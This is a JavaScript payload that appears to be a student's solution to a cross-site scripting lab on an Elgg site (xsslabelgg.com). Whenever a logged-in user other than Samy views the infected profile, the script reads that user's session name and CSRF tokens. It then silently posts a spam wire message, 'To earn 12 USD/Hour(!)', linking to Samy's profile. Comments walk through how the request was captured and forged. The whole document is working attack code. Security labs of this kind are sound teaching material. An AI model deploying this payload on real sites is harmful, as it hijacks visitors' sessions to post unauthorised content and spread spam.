
<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token

    
// For this Task, I logged in from Alice and posted some random things in the wire, thus I got a "Post" request.

// I retrieved the url body and parameters and then edited the url.I edited the "body" in the url so that it conatins 
// the link of the Samy's profile and the specified texts before it.

// FInally to make sure Samy doesnot get affected by the code,I used a if condition to check if the 
// person vsiting samy's profile was not Samy himself.


    var name=elgg.session.user.name;
    if(name!="Samy")
    {
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
      
        var body="&body=To earn 12 USD/Hour(!), visit now "+"http://www.xsslabelgg.com/profile/samy";

        var sendurl="http://www.xsslabelgg.com/action/thewire/add";

        var content=token+ts+body;

        var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);


    }

}
	

//__elgg_token=rW0DNl_rz3okGos6hdGhyA&__elgg_ts=1624205560&body=Buet+cse+16	
	
</script>